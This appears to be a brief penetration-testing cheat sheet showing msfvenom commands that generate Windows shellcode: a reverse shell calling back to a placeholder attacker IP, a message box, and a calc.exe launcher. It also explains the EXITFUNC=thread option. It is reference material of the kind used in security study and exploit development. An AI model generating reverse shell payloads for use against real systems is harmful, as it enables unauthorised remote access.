---
description: 06/08/2022
---

# Generating Shellcode w/ MSFVenom

## Examples

### Reverse Shells

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP_HERE LPORT=1337 -f c
```

### Windows Message Box

```
msfvenom -p windows/x64/messagebox EXITFUNC=thread -f c
```

### "Pop Calc"

```
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
```

## Notes

{% embed url="https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/" %}

Why `EXITFUNC=thread`? It will specify a DLL and function to call when the payload is complete.&#x20;

`thread` is the most used in exploitation scenarios where the exploited process runs the shellcode in a subthread and upon exiting this thread will result in a working application/system (clean exit).
